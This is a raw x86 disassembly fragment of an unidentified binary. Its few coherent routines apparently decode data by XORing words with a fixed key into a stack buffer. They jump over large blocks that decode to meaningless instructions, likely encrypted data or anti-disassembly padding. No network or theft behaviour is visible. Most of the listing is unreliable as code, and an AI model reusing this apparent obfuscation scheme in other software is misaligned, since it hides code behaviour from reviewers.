  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x31518918],1
  407796:	dec    ebx
  407797:	xlat   BYTE PTR ds:[ebx]
  407798:	lock mov al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x40777f
  4077a2:	pop    ecx
  4077a3:	adc    esp,DWORD PTR [esi]
  4077a5:	dec    edx
  4077a6:	sub    BYTE PTR [edx+ebp*2],0x1f
  4077aa:	adc    edi,0xffffff88
  4077ad:	cmc    
  4077ae:	imul   ecx,esp,0x12
  4077b1:	ja     0x4077de
  4077b3:	ins    DWORD PTR es:[edi],dx
  4077b4:	jmp    0x2504a50a
  4077b9:	mov    dh,0x9c
  4077bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077bc:	mov    bl,0x78
  4077be:	popa   
  4077bf:	sbb    al,0x48
  4077c1:	or     eax,0xd1a3c748
  4077c6:	sbb    al,0x4c
  4077c8:	add    DWORD PTR [eax+ebp*2],edi
  4077cb:	fist   DWORD PTR [edx-0x38]
  4077ce:	es dec eax
  4077d0:	xlat   BYTE PTR ds:[ebx]
  4077d1:	sub    BYTE PTR [ebp+ecx*8+0x7c],cl
  4077d5:	dec    edi
  4077d6:	(bad)  
  4077d7:	mov    al,0x61
  4077d9:	ret    
  4077da:	into   
  4077db:	loopne 0x40779a
  4077dd:	mov    edx,DWORD PTR cs:0xd97027e2
  4077e4:	add    al,0x48
  4077e6:	mov    dl,0xb6
  4077e8:	cmp    eax,0xbabdbf08
  4077ed:	xor    eax,0xb8936698
  4077f2:	stos   DWORD PTR es:[edi],eax
  4077f3:	sub    al,0x62
  4077f5:	mov    ch,0x36
  4077f7:	mov    cl,0x6d
  4077f9:	jae    0x4077d3
  4077fb:	xor    DWORD PTR [edi+0x32ec8d8c],esp
  407801:	jb     0x4077e6
  407803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407804:	inc    esi
  407805:	pop    esp
  407806:	cdq    
  407807:	sbb    al,0x33
  407809:	test   al,0xfe
  40780b:	sub    eax,0x97482c05
  407810:	xlat   BYTE PTR ds:[ebx]
  407811:	stos   DWORD PTR es:[edi],eax
  407812:	adc    al,bl
  407814:	bound  esi,QWORD PTR [esi+0xa]
  407817:	out    dx,al
  407818:	test   eax,0x6d1b3098
  40781d:	dec    eax
  40781e:	lahf   
  40781f:	repz js 0x4077fa
  407822:	fsubr  st,st(3)
  407824:	mov    bl,0xca
  407826:	lea    eax,[ebx+0x53d46b72]
  40782c:	xor    al,0x22
  40782e:	stc    
  40782f:	jecxz  0x407899
  407831:	test   bh,bh
  407833:	xchg   ecx,eax
  407834:	(bad)  
  407835:	lahf   
  407836:	cmp    ecx,DWORD PTR [ecx]
  407838:	fsubr  DWORD PTR [eax-0x37]
  40783b:	std    
  40783c:	sti    
  40783d:	mov    cl,0x60
  40783f:	test   DWORD PTR [eax-0x4d6720c9],0xf96167c
  407849:	js     0x40788c
  40784b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40784c:	jae    0x4078be
  40784e:	mov    ds:0x609933f5,eax
  407853:	repnz (bad) 
  407855:	adc    DWORD PTR [ecx-0x3d],ecx
  407858:	out    0x81,al
  40785a:	inc    edx
  40785b:	inc    DWORD PTR [ecx+edi*4+0x6c7d5690]
  407862:	jno    0x407830
  407864:	outs   dx,BYTE PTR ds:[esi]
  407865:	shl    BYTE PTR [eax-0x765a56c3],0x70
  40786c:	mov    edx,0xafa92ced
  407871:	push   eax
  407872:	call   0xbb37:0xfed6dc8
  407879:	in     eax,0xfd
  40787b:	sar    ah,1
  40787d:	pop    edx
  40787e:	int    0x3a
  407880:	mov    eax,DWORD PTR [esi+0x7aba2135]
  407886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407887:	sub    eax,0x734316c2
  40788c:	jp     0x4078c8
  40788e:	out    0x7d,eax
  407890:	and    bl,BYTE PTR [ebp+0x1c]
  407893:	outs   dx,DWORD PTR ds:[esi]
  407894:	out    0xcd,al
  407896:	xlat   BYTE PTR ds:[ebx]
  407897:	inc    ebx
  407898:	sub    bl,BYTE PTR [ebx+0x3e]
  40789b:	adc    al,0x16
  40789d:	ss adc al,0x17
  4078a0:	pop    esp
  4078a1:	cmp    dl,dl
  4078a3:	(bad)  
  4078a4:	dec    esp
  4078a5:	pushf  
  4078a6:	inc    edx
  4078a7:	sbb    eax,0x1641752a
  4078ac:	and    eax,0xc47236
  4078b1:	jp     0x407843
  4078b3:	pop    es
  4078b4:	in     al,dx
  4078b5:	pop    esp
  4078b6:	cdq    
  4078b7:	mov    dh,0x34
  4078b9:	fiadd  DWORD PTR [edi]
  4078bb:	xor    BYTE PTR [ecx],cl
  4078bd:	pushf  
  4078be:	aam    0x5c
  4078c0:	fsub   QWORD PTR [esi]
  4078c2:	shl    DWORD PTR [ecx],1
  4078c4:	cwde   
  4078c5:	mov    esi,DWORD PTR [eax+edi*8]
  4078c8:	out    0x54,eax
  4078ca:	mov    ecx,0x9ea8fee4
  4078cf:	div    BYTE PTR [ebp-0x76c3a5fd]
  4078d5:	in     al,0xc3
  4078d7:	jbe    0x407868
  4078d9:	mov    ebp,0xc4a5413d
  4078de:	outs   dx,BYTE PTR ds:[esi]
  4078df:	mov    esp,0x4364b0cf
  4078e4:	repnz push edx
  4078e6:	mov    bh,0xe
  4078e8:	clc    
  4078e9:	jmp    0xb1d13342
  4078ee:	dec    ecx
  4078ef:	xchg   ebp,eax
  4078f0:	js     0x4078ad
  4078f2:	cmp    ecx,DWORD PTR [edi+0x45]
  4078f5:	pusha  
  4078f6:	adc    edx,DWORD PTR [esi-0x2bbaa140]
  4078fc:	in     eax,0xe3
  4078fe:	inc    esi
  4078ff:	jne    0x40796d
  407901:	out    dx,al
  407902:	fs sub al,0x20
  407906:	test   DWORD PTR [ebx-0x21],ecx
  407909:	fwait
  40790a:	repz jnp 0x4078fb
  40790d:	call   0x1a5e634
  407912:	fwait
  407913:	in     al,0x81
  407915:	inc    ebx
  407916:	dec    ebx
  407917:	retf   
  407918:	push   edi
  407919:	sbb    BYTE PTR [ecx+0x23205fe0],dh
  40791f:	sahf   
  407920:	test   al,0x5f
  407922:	ja     0x407946
  407924:	retf   
  407925:	(bad)  
  407926:	mov    ch,0xcb
  407928:	sub    esp,ebp
  40792a:	xlat   BYTE PTR ds:[ebx]
  40792b:	or     eax,0x45da80d3
  407930:	mov    dl,0x26
  407932:	push   cs
  407933:	or     ax,WORD PTR [edx-0x32]
  407937:	fldenv [esi-0x25]
  40793a:	test   eax,0x8275c4ea
  40793f:	inc    edx
  407940:	pop    es
  407941:	fsubr  DWORD PTR [esi+0x983d3ee]
  407947:	out    dx,eax
  407948:	test   BYTE PTR [eax-0x1e],cl
  40794b:	push   esp
  40794c:	sub    ebp,DWORD PTR ds:0xcca3fda5
  407952:	push   edi
  407953:	and    al,0x1c
  407955:	aaa    
  407956:	cmp    ah,bl
  407958:	pop    ss
  407959:	xchg   DWORD PTR [ebp+0x2a],eax
  40795c:	cmp    esi,DWORD PTR [edx+0x47662e1b]
  407962:	xchg   ecx,eax
  407963:	je     0x407934
  407965:	imul   eax,DWORD PTR [edx],0x466e5476
  40796b:	faddp  st(7),st
  40796d:	xchg   DWORD PTR [ecx],esi
  40796f:	xchg   ebp,eax
  407970:	push   ecx
  407971:	(bad)
  407974:	shl    BYTE PTR [esi-0x6e680bc0],cl
  40797a:	push   edi
  40797b:	and    eax,0x892ec969
  407980:	xchg   esi,eax
  407981:	push   ss
  407982:	ss ret 
  407984:	mov    ebx,0xc15dc55e
  407989:	lahf   
  40798a:	shr    BYTE PTR [edi+0x73eb8b7a],cl
  407990:	push   0xa0ea9dcb
  407995:	add    al,0x4a
  407997:	mov    esp,0xcb1b7e93
  40799c:	div    DWORD PTR [eax+0x2a39ca7e]
  4079a2:	das    
  4079a3:	sbb    ecx,DWORD PTR [ecx+0x5599cdcd]
  4079a9:	jne    0x407952
  4079ab:	rol    DWORD PTR [edx],cl
  4079ad:	aaa    
  4079ae:	xchg   ecx,eax
  4079af:	rcr    bh,0xa8
  4079b2:	lods   eax,DWORD PTR ds:[esi]
  4079b3:	fidiv  WORD PTR [ecx]
  4079b5:	rcl    BYTE PTR [edi-0x5],0x4a
  4079b9:	xchg   ecx,eax
  4079ba:	retf   0xbfc0
  4079bd:	int    0xeb
  4079bf:	mov    edi,0xeb56b35b
  4079c4:	in     al,0xce
  4079c6:	and    edx,DWORD PTR [ebx+0x28]
  4079c9:	mov    edi,0x2b6e4f0e
  4079ce:	call   0xbd7a:0xef485c04
  4079d5:	push   esp
  4079d6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079d8:	sahf   
  4079d9:	popa   
  4079da:	adc    eax,0x1c44b565
  4079df:	or     BYTE PTR [eax],cl
  4079e1:	sar    bh,0xe6
  4079e4:	je     0x4079ed
  4079e6:	cmp    eax,0x30e7ba9
  4079eb:	(bad)  
  4079ec:	cmp    al,0xe9
  4079ee:	add    edi,esi
  4079f0:	mov    eax,ds:0xf6fd1be4
  4079f5:	es jnp 0x40797a
  4079f8:	mov    ch,0x86
  4079fa:	cli    
  4079fb:	dec    esi
  4079fc:	mov    cl,BYTE PTR [edi]
  4079fe:	ret    0xc4c5
  407a01:	mov    BYTE PTR [ebp-0x35],ah
  407a04:	dec    edi
  407a05:	mov    es,WORD PTR [eax]
  407a07:	sti    
  407a08:	pusha  
  407a09:	(bad)  
  407a0a:	sbb    al,0x5d
  407a0c:	pop    eax
  407a0d:	push   ebx
  407a0e:	(bad)  
  407a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a10:	rol    DWORD PTR [esi],cl
  407a12:	ror    BYTE PTR [ecx],1
  407a14:	scas   eax,DWORD PTR es:[edi]
  407a15:	push   ecx
  407a16:	inc    ebx
  407a17:	(bad)
  407a1a:	jmp    0x3f09:0x57718302
  407a21:	dec    edx
  407a22:	sub    al,0x15
  407a24:	aaa    
  407a25:	mov    ss,WORD PTR [edi]
  407a27:	into   
  407a28:	das    
  407a29:	stc    
  407a2a:	jmp    0x407a0f
  407a2c:	retfw  
  407a2e:	xchg   DWORD PTR [esi-0x47],ebp
  407a31:	mov    esp,0x66d83979
  407a36:	ja     0x407a08
  407a38:	sub    eax,0x49a5ddb0
  407a3d:	xchg   edx,eax
  407a3e:	mov    eax,0x1ceac286
  407a43:	or     dh,BYTE PTR [edx+0x339c942d]
  407a49:	mov    al,0xc7
  407a4b:	sub    ebp,DWORD PTR ds:0xe3ba7486
  407a51:	adc    ebx,ebx
  407a53:	stc    
  407a54:	ret    
  407a55:	sub    al,BYTE PTR [eax-0x32998a9c]
  407a5b:	inc    ebp
  407a5c:	lea    ecx,[edx-0x69]
  407a5f:	pop    esi
  407a60:	in     eax,0x4a
  407a62:	xchg   ebx,eax
  407a63:	pop    eax
  407a64:	shr    ecx,1
  407a66:	sti    
  407a67:	shl    DWORD PTR [ebp-0x6f],cl
  407a6a:	adc    cl,ch
  407a6c:	pop    ss
  407a6d:	leave  
  407a6e:	(bad)  
  407a70:	test   BYTE PTR [ebx-0x10],0x5c
  407a74:	adc    DWORD PTR [esi+0x29116289],edi
  407a7a:	push   ebx
  407a7b:	jge    0x407a88
  407a7d:	jno    0x407a26
  407a7f:	aas    
  407a80:	rcr    bl,0x11
  407a83:	pop    ebp
  407a84:	sub    DWORD PTR [edi],esp
  407a86:	ror    edi,cl
  407a88:	or     BYTE PTR [esi],ah
  407a8a:	inc    eax
  407a8b:	test   DWORD PTR [ebx+0xfc70366],ebx
  407a91:	mov    bh,0xc0
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	xchg   esi,eax
  407ac1:	sti    
  407ac2:	js     0x407a9d
  407ac4:	pushf  
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407ad3
  407acd:	push   ecx
  407ace:	cmp    ebp,esp
  407ad0:	fs or  bl,ch
  407ad3:	(bad)  [esi+0x44e07e26]
  407ad9:	adc    dh,BYTE PTR [edi-0x2060780d]
  407adf:	mov    bl,BYTE PTR [ecx+eiz*2+0x5b0d521]
  407ae6:	das    
  407ae7:	adc    esi,edi
  407ae9:	addr16 ret 0xdd6a
  407aed:	into   
  407aee:	sbb    al,0xb6
  407af0:	in     al,0x12
  407af2:	sub    al,0x8
  407af4:	inc    edx
  407af5:	and    DWORD PTR [eax-0x454091d1],0xdd81abfa
  407aff:	or     BYTE PTR [edx-0x3b],bl
  407b02:	adc    eax,0x196acfbe
  407b07:	push   ecx
  407b08:	jb     0x407af7
  407b0a:	adc    edi,DWORD PTR [esi+0x2b]
  407b0d:	push   esp
  407b0e:	(bad)  [esi]
  407b10:	sub    DWORD PTR [edx],0xffffffef
  407b13:	push   ebx
  407b14:	and    bh,BYTE PTR ds:[eax+ecx*2-0x20c96c98]
  407b1c:	ret    0x4c5b
  407b1f:	or     DWORD PTR [edx],edi
  407b21:	out    0xcd,eax
  407b23:	cdq    
  407b24:	arpl   bp,bx
  407b26:	out    dx,eax
  407b27:	mov    eax,0x18b6c73
  407b2c:	(bad)  
  407b2d:	and    ebx,DWORD PTR [ecx+0x6b]
  407b30:	in     eax,0x5f
  407b32:	outs   dx,BYTE PTR ds:[esi]
  407b33:	mov    cl,0x66
  407b35:	scas   eax,DWORD PTR es:[edi]
  407b36:	add    eax,edx
  407b38:	fstp   TBYTE PTR [ebx]
  407b3a:	shl    BYTE PTR [esi+0x6a],0x1f
  407b3e:	inc    ebp
  407b3f:	out    0xb3,eax
  407b41:	rol    BYTE PTR [edi],1
  407b43:	mov    bl,0xea
  407b45:	pop    ds
  407b46:	imul   ecx,edi,0xffffff99
  407b49:	push   0xfffffffa
  407b4b:	fld    TBYTE PTR [edx+0x281e81a1]
  407b51:	or     eax,0x18aafd9c
  407b56:	sahf   
  407b57:	inc    ebp
  407b58:	rol    ch,cl
  407b5a:	popf   
  407b5b:	jno    0x407bc1
  407b5d:	shl    DWORD PTR [edi-0x22],1
  407b60:	or     dh,BYTE PTR [edi]
  407b62:	mov    esp,DWORD PTR [edx-0x757c57a4]
  407b68:	call   0xe4f43f66
  407b6d:	ror    DWORD PTR [edx+0x667932f],1
  407b73:	ss cwde 
  407b75:	aam    0x66
  407b77:	fsub   QWORD PTR [edx+0x9]
  407b7a:	stc    
  407b7b:	xor    al,0xed
  407b7d:	or     al,0x38
  407b7f:	xor    DWORD PTR [edx-0x70],esp
  407b82:	pop    edi
  407b83:	xor    BYTE PTR [ecx],ch
  407b85:	adc    eax,0xc6079c6f
  407b8a:	push   ss
  407b8b:	jmp    0x1714:0x9648ae87
  407b92:	and    BYTE PTR [ebp+0x47],ah
  407b95:	mov    WORD PTR ds:0xa8a67112,gs
  407b9b:	jae    0x407bde
  407b9d:	jmp    0x407c16
  407b9f:	adc    ebx,DWORD PTR [edx]
  407ba1:	cmp    DWORD PTR [edi+0x545fd763],edx
  407ba7:	nop
  407ba8:	pop    es
  407ba9:	(bad)  
  407baa:	retf   0x4f05
  407bad:	ror    BYTE PTR [edi+0x32],1
  407bb0:	jecxz  0x407bff
  407bb2:	int    0xf2
  407bb4:	je     0x407b60
  407bb6:	aas    
  407bb7:	scas   al,BYTE PTR es:[edi]
  407bb8:	fild   WORD PTR [edi-0x64]
  407bbb:	cmp    BYTE PTR [ebx],dl
  407bbd:	mov    ch,ch
  407bbf:	inc    BYTE PTR gs:[ebp-0x5b]
  407bc3:	(bad)  
  407bc4:	sub    eax,0x6de72c0
  407bc9:	ss jo  0x407b91
  407bcc:	push   ebx
  407bcd:	jns    0x407bec
  407bcf:	or     WORD PTR [edi+eiz*1],0x47
  407bd4:	adc    edi,DWORD PTR [edi+0x1b]
  407bd7:	imul   edi,DWORD PTR [ebx-0x1],0x313d5fdc
  407bde:	pushf  
  407bdf:	cmp    dl,bl
  407be1:	mov    esi,0xbec37d1b
  407be6:	or     esp,DWORD PTR [edx]
  407be8:	xchg   DWORD PTR [ecx+0x6d71b50],esp
  407bee:	call   0xda3c:0x238c99da
  407bf5:	or     DWORD PTR [eax+eiz*4+0x466655c6],esp
  407bfc:	xchg   esi,eax
  407bfd:	out    0x7,eax
  407bff:	ds sub al,0x85
  407c02:	mov    eax,ds:0x73f57331
  407c07:	(bad)  
  407c08:	mov    ds:0x779a3e07,eax
  407c0d:	and    al,dl
  407c0f:	lahf   
  407c10:	les    esp,FWORD PTR [eax]
  407c12:	in     eax,dx
  407c13:	xor    edx,ebp
  407c15:	jmp    0x3178714d
  407c1a:	std    
  407c1b:	aaa    
  407c1c:	leave  
  407c1d:	stos   BYTE PTR es:[edi],al
  407c1e:	fbld   TBYTE PTR [ecx-0x5db5f73d]
  407c24:	add    esp,edi
  407c26:	(bad)  
  407c27:	mov    dh,0x0
  407c29:	inc    esi
  407c2a:	xor    bl,dh
  407c2c:	ret    
  407c2d:	outs   dx,DWORD PTR ds:[esi]
  407c2e:	xor    ebp,DWORD PTR [edi]
  407c30:	jmp    0xb8fa:0xae3b2667
  407c37:	mov    ecx,0x5a4b1faa
  407c3c:	or     BYTE PTR [edi-0x80],0x64
  407c40:	cmp    DWORD PTR [edi-0x72d43316],esi
  407c46:	jb     0x407c7c
  407c48:	mov    al,ds:0x35a01746
  407c4d:	call   0xa94e9791
  407c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c53:	add    DWORD PTR [ebx],esp
  407c55:	jnp    0x407c0f
  407c57:	push   ds
  407c58:	loope  0x407c61
  407c5a:	add    bh,ah
  407c5c:	sbb    edi,DWORD PTR [edi-0x4d9e325f]
  407c62:	sbb    al,0x3e
  407c64:	mov    cl,0x8c
  407c66:	push   esi
  407c67:	mov    ecx,DWORD PTR [ebx+0x22]
  407c6a:	(bad)  
  407c6b:	inc    esp
  407c6c:	cs dec ebp
  407c6e:	imul   ebp,DWORD PTR [eax+0x71],0xffffffcb
  407c72:	adc    edi,DWORD PTR [esi-0x2fc1086f]
  407c78:	icebp  
  407c79:	ror    DWORD PTR [ebp+0x45],0x7c
  407c7d:	mov    ebp,0xb0d98895
  407c82:	dec    ebx
  407c83:	xor    eax,0x29eceeb6
  407c88:	cmp    DWORD PTR [ebx+0x67],edi
  407c8b:	gs push es
  407c8d:	xchg   ebx,eax
  407c8e:	cmp    bl,bl
  407c90:	inc    edi
  407c91:	push   ebp
  407c92:	pop    edi
  407c93:	repnz popa 
  407c95:	daa    
  407c96:	aaa    
  407c97:	mov    al,0x13
  407c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c9a:	push   esi
  407c9b:	push   esp
  407c9c:	pop    es
  407c9d:	scas   eax,DWORD PTR es:[edi]
  407c9e:	push   ss
  407c9f:	mov    ebx,esi
  407ca1:	sub    ebx,DWORD PTR cs:[eax-0xbbc61a0]
  407ca8:	sbb    ecx,DWORD PTR [edi-0x6627c822]
  407cae:	mov    ?,WORD PTR [ebp+0xf]
  407cb1:	popa   
  407cb2:	jmp    0xec27:0x40457214
  407cb9:	jmp    0x1e6f3bf7
  407cbe:	loopne 0x407d2b
  407cc0:	rcr    DWORD PTR [eax-0x5c],0x16
  407cc4:	sar    esi,0xd2
  407cc7:	pop    es
  407cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cc9:	jbe    0x407c55
  407ccb:	out    dx,eax
  407ccc:	xchg   DWORD PTR [eax-0x6101e160],ebx
  407cd2:	call   0xb63655fd
  407cd7:	mov    esi,0xdfae67cd
  407cdc:	mov    eax,ds:0xff096f30
  407ce1:	ret    0xde41
  407ce4:	sar    esp,1
  407ce6:	adc    edx,DWORD PTR [esi-0x7c630e37]
  407cec:	push   es
  407ced:	jle    0x407c76
  407cef:	dec    esi
  407cf0:	(bad)  
  407cf1:	test   BYTE PTR [ecx-0x53360f40],0x66
  407cf8:	adc    BYTE PTR [ecx-0x26],al
  407cfb:	or     DWORD PTR [ecx-0x35a726c8],ecx
  407d01:	mov    ds:0xe66ab9f0,al
  407d06:	xchg   ecx,eax
  407d07:	mov    ah,0x3e
  407d09:	js     0x407d85
  407d0b:	imul   esp,DWORD PTR [eax+0x15fd1481],0xa4a99d47
  407d15:	shr    BYTE PTR [ebp-0x51],cl
  407d18:	das    
  407d19:	clc    
  407d1a:	enter  0x16a3,0x57
  407d1e:	xchg   esp,eax
  407d1f:	dec    edi
  407d20:	mov    esi,0x819adb10
  407d25:	cdq    
  407d26:	push   0x2f
  407d28:	or     DWORD PTR [edx],edx
  407d2a:	jecxz  0x407d2f
  407d2c:	stos   BYTE PTR es:[edi],al
  407d2d:	cmc    
  407d2e:	xor    cl,dl
  407d30:	lods   eax,DWORD PTR ds:[esi]
  407d31:	cmp    al,0x75
  407d33:	test   al,0x42
  407d35:	jbe    0x407db6
  407d37:	sbb    ebp,DWORD PTR [ecx+esi*4]
  407d3a:	cdq    
  407d3b:	fld    TBYTE PTR [ebx+0x3b]
  407d3e:	bound  esp,QWORD PTR [ebx-0x3ccaecb6]
  407d44:	push   0x0
  407d46:	das    
  407d47:	arpl   di,si
  407d49:	pop    es
  407d4a:	dec    edx
  407d4b:	cmp    ebx,0xab05dcd
  407d51:	cdq    
  407d52:	mov    ebp,0xb4141d72
  407d57:	bnd ja 0x407da0
  407d5a:	xor    BYTE PTR [edi],0x99
  407d5d:	stos   BYTE PTR es:[edi],al
  407d5e:	sub    BYTE PTR [esi-0x24],0x64
  407d62:	or     eax,0xb8ee168c
  407d67:	jg     0x407d96
  407d69:	pop    esp
  407d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d6b:	rcl    DWORD PTR [edi],1
  407d6d:	stos   BYTE PTR es:[edi],al
  407d6e:	xor    BYTE PTR [ebp-0x49ed6866],cl
  407d74:	pop    ebp
  407d75:	(bad)  [edx+0x7516beb]
  407d7b:	xor    al,0x23
  407d7d:	aad    0xea
  407d7f:	push   eax
  407d80:	test   al,0x2c
  407d82:	dec    esp
  407d83:	xor    bh,BYTE PTR [edi-0xddcf83f]
  407d89:	add    DWORD PTR [edx],edx
  407d8b:	sahf   
  407d8c:	or     al,0xb2
  407d8e:	pop    es
  407d8f:	(bad)
  407d92:	mov    ecx,0x33effa7f
  407d97:	pusha  
  407d98:	fstp   TBYTE PTR [ebp-0x77]
  407d9b:	int    0xd6
  407d9d:	xor    ecx,DWORD PTR [ebp+0x59700e95]
  407da3:	pop    ss
  407da4:	mov    ebp,0x6c491ef6
  407da9:	(bad)  
  407daa:	(bad)  
  407dab:	push   ecx
  407dac:	(bad)  
  407dae:	adc    BYTE PTR [esi+0x4c18ac46],dh
  407db4:	test   BYTE PTR [ecx+ebp*8],cl
  407db7:	cwde   
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fsub   st,st(4)
  407dda:	js     0x407df5
  407ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ddd:	mov    al,bl
  407ddf:	js     0x407e59
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407da4
  407de6:	mov    ?,WORD PTR [ebp+0x48]
  407de9:	adc    ah,BYTE PTR ds:0xdbcadff0
  407def:	fidiv  DWORD PTR [ebx+0x7c]
  407df2:	repz mov ds:0x215b1ffc,eax
  407df8:	mov    dl,0xb5
  407dfa:	jb     0x407dfd
  407dfc:	mov    dh,0x3e
  407dfe:	xchg   esi,eax
  407dff:	sahf   
  407e00:	mov    es:0x7b1dcebe,al
  407e06:	or     DWORD PTR [ecx],esi
  407e08:	test   BYTE PTR [eax+0x4deb0712],bl
  407e0e:	inc    ecx
  407e0f:	repz jmp 0x6317:0xea028165
  407e17:	in     al,0x50
  407e19:	mov    ebp,0x5073e020
  407e1e:	mov    esi,DWORD PTR [ebx+0x263b026c]
  407e24:	push   ebp
  407e25:	ins    DWORD PTR es:[edi],dx
  407e26:	jl     0x407e73
  407e28:	outs   dx,BYTE PTR ds:[esi]
  407e29:	sbb    BYTE PTR [ebx-0x56eeb0d],ch
  407e2f:	mov    ds:0xccb2f380,al
  407e34:	iret   
  407e35:	ds stc 
  407e37:	ja     0x407ea2
  407e39:	push   0x6531a586
  407e3e:	idiv   BYTE PTR [edx-0x73241f0f]
  407e44:	mov    edx,0x707a9193
  407e49:	imul   ebx,ebx,0xffffff8d
  407e4c:	repnz jecxz 0x407ddf
  407e4f:	mov    edx,0x64bf4bef
  407e54:	adc    bh,BYTE PTR [eax]
  407e56:	pop    edi
  407e57:	dec    edx
  407e58:	xchg   esp,eax
  407e59:	push   cs
  407e5a:	retf   
  407e5b:	jmp    0xf307dfab
  407e60:	in     al,dx
  407e61:	inc    edi
  407e62:	xchg   DWORD PTR [esi],esi
  407e64:	jno    0x407e24
  407e66:	push   0xffffff81
  407e68:	cmp    al,0xde
  407e6a:	xchg   edi,eax
  407e6b:	pushf  
  407e6c:	xchg   ecx,esp
  407e6e:	dec    edi
  407e6f:	mov    dl,BYTE PTR [esi+edx*2-0x1c50d762]
  407e76:	cdq    
  407e77:	inc    esi
  407e78:	jae    0x407eba
  407e7a:	sbb    al,0xc4
  407e7c:	into   
  407e7d:	out    0x64,al
  407e7f:	jo     0x407e0c
  407e81:	xchg   ecx,eax
  407e82:	sbb    ah,BYTE PTR [edi]
  407e84:	or     al,dh
  407e86:	iret   
  407e87:	outs   dx,BYTE PTR ds:[esi]
  407e88:	jg     0x407e40
  407e8a:	imul   esp,DWORD PTR [esi],0x97ec7f85
  407e90:	ja     0x407e8f
  407e92:	or     BYTE PTR [edi-0x2a],bl
  407e95:	popa   
  407e96:	jge    0x407e6e
  407e98:	int3   
  407e99:	sahf   
  407e9a:	inc    edi
  407e9b:	inc    eax
  407e9c:	fisubr WORD PTR [edx]
  407e9e:	(bad)  
  407e9f:	lahf   
  407ea0:	arpl   sp,cx
  407ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea3:	(bad)  
  407ea4:	dec    ebp
  407ea5:	inc    edi
  407ea6:	int    0x21
  407ea8:	jl     0x407eb3
  407eaa:	ror    DWORD PTR [edi],1
  407eac:	mov    edx,0x6cce9a8d
  407eb1:	and    cl,al
  407eb3:	inc    esi
  407eb4:	sbb    al,0xce
  407eb6:	mov    DWORD PTR [ecx-0x54],ebp
  407eb9:	retf   0x75c0
  407ebc:	cmp    al,0xe4
  407ebe:	fcom   DWORD PTR [edi]
  407ec0:	enter  0x1931,0x9f
  407ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec5:	cmp    al,0xf7
  407ec7:	ja     0x407f24
  407ec9:	and    BYTE PTR [ebp+0x37094707],dl
  407ecf:	add    eax,0xd46bee41
  407ed4:	clc    
  407ed5:	cmp    ecx,esp
  407ed7:	inc    ebx
  407ed8:	addr16 dec esp
  407eda:	iret   
  407edb:	add    eax,0xc8a809a5
  407ee0:	mov    bl,0xa4
  407ee2:	in     eax,dx
  407ee3:	bnd jbe 0x407e6f
  407ee6:	pop    es
  407ee7:	or     DWORD PTR [eax+0x35f881da],0xffffff81
  407eee:	xor    BYTE PTR [edx],dh
  407ef0:	test   DWORD PTR [esi],ebx
  407ef2:	aam    0x54
  407ef4:	div    DWORD PTR [edi-0x4e]
  407ef7:	jo     0x407e92
  407ef9:	add    eax,0xf8ac2d76
  407efe:	jle    0x407f1a
  407f00:	int    0x36
  407f02:	test   eax,0x6c3386f9
  407f07:	aad    0x8d
  407f09:	mov    edx,DWORD PTR [eax-0x2e]
  407f0c:	cld    
  407f0d:	or     esi,edx
  407f0f:	mov    edi,0xd7d67724
  407f14:	or     bl,ah
  407f16:	ds std 
  407f18:	push   ebp
  407f19:	mov    dl,0xda
  407f1b:	rol    DWORD PTR [eax-0x4baa91dd],1
  407f21:	pop    ds
  407f22:	div    DWORD PTR [edx]
  407f24:	push   esp
  407f25:	popf   
  407f26:	mov    ch,0x88
  407f28:	daa    
  407f29:	(bad)  
  407f2a:	leave  
